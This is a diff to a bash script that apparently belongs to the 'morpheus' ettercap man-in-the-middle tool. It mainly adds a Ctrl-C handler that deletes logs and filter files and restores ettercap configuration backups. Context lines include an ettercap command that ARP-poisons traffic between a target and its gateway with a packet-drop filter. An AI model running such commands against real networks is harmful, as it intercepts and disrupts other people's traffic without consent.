@@ -163,7 +163,33 @@ else
 fi
 
 
-
+# ----------------------------------
+# bash trap ctrl-c and call ctrl_c()
+# ----------------------------------
+trap ctrl_c INT
+ctrl_c() {
+echo "${RedF}[x]${white} CTRL+C abort tasks${RedF}...${Reset}"
+# clean logfiles folder at exit
+rm $IPATH/logs/lan.mop > /dev/null 2>&1
+rm $IPATH/output/firewall.ef > /dev/null 2>&1
+rm $IPATH/output/template.ef > /dev/null 2>&1
+rm $IPATH/output/packet_drop.ef > /dev/null 2>&1
+rm $IPATH/output/img_replace.ef > /dev/null 2>&1
+# revert filters to default stage
+mv $IPATH/filters/firewall.bk $IPATH/filters/firewall.eft > /dev/null 2>&1
+mv $IPATH/filters/template.bk $IPATH/filters/template.eft > /dev/null 2>&1
+mv $IPATH/filters/packet_drop.bk $IPATH/filters/packet_drop.eft > /dev/null 2>&1
+mv $IPATH/filters/img_replace.bk $IPATH/filters/img_replace.eft > /dev/null 2>&1
+# revert ettercap conf files to default stage
+if [ -e $Edns ]; then
+mv /tmp/etter.dns $Edns > /dev/null 2>&1
+fi
+if [ -e $Econ ]; then
+mv /tmp/etter.conf $Econ > /dev/null 2>&1
+fi
+sleep 2
+exit
+}
 
 
 
@@ -238,7 +264,6 @@ gateway=$(zenity --title="☠ Enter GATEWAY ☠" --text "'morpheus arp poison se
         ettercap -T -q -i $InT3R -F $IPATH/output/packet_drop.ef -L $IPATH/logs/packet_drop -M ARP /$rhost/ /$gateway/
         fi
       fi
-
 
   # clean up
   echo ${BlueF}[☠]${white} Cleaning recent files${RedF}!${Reset};
@@ -544,6 +569,7 @@ else
   sleep 2
 fi
 }
+
 
 
 
